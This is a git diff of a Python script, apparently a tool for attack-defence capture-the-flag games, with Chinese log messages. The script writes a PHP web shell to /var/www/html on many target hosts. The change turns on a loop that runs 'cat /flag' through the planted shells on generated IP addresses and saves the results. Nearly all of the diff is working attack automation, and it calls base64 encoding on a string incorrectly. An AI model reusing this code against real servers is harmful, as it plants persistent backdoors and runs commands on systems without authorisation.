@@ -1,5 +1,4 @@
 import base64
-
 import requests
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -14,7 +13,7 @@ class PHPConnectionTester:
     OUTPUT_FILE: str = "flags.txt"
     HEADERS: dict = {'Content-Type': 'application/x-www-form-urlencoded'}
     PHP_FILE: str = 'shell/souno.php'
-    SHELL_DIR: str = '/var/www/html/'
+    SHELL_PATH: str = '/'
 
     def __init__(self):
         self.use_system: bool = False
@@ -83,9 +82,9 @@ class PHPConnectionTester:
         """
         ph = open(self.PHP_FILE, "r").read()
         if use_system:
-            command = f'echo \'{ph}\' > {self.SHELL_DIR}souno.php'
+            command = f'echo \'{ph}\' > /var/www/html{self.SHELL_PATH}souno.php'
         else:
-            command = f"file_put_contents(\"{self.SHELL_DIR}souno.php\",base64_decode(\"{ph}\"));"
+            command = f"file_put_contents(\"/var/www/html{self.SHELL_PATH}souno.php\",base64_decode(\"{base64.b64encode(ph)}\"));"
         try:
             with open(self.URLS_FILE, 'r') as file:
                 urls = [line.strip() for line in file if line.strip()]
@@ -111,16 +110,16 @@ class PHPConnectionTester:
                         future.result()
                     except Exception as e:
                         rich_print(f"{url} 异常: {e}")
-            # with ThreadPoolExecutor(max_workers=10) as executor:
-            #     future_to_url = {
-            #         executor.submit(self.test_php_connection, url, "souno", "cat /flag", method, use_system): url for
-            #         url in IPManager().generate_urls(port, "/souno.php")
-            #     }
-            #     for future in as_completed(future_to_url):
-            #         url = future_to_url[future]
-            #         try:
-            #             future.result()
-            #         except Exception as e:
-            #             rich_print(f"{url} 异常: {e}")
+            with ThreadPoolExecutor(max_workers=10) as executor:
+                future_to_url = {
+                    executor.submit(self.test_php_connection, url, "souno", "cat /flag", "GET", use_system): url for
+                    url in IPManager().generate_urls(port, f"{self.SHELL_PATH}souno.php")
+                }
+                for future in as_completed(future_to_url):
+                    url = future_to_url[future]
+                    try:
+                        future.result()
+                    except Exception as e:
+                        rich_print(f"{url} 异常: {e}")
         except FileNotFoundError:
             rich_print(f"文件未找到: {self.URLS_FILE}")
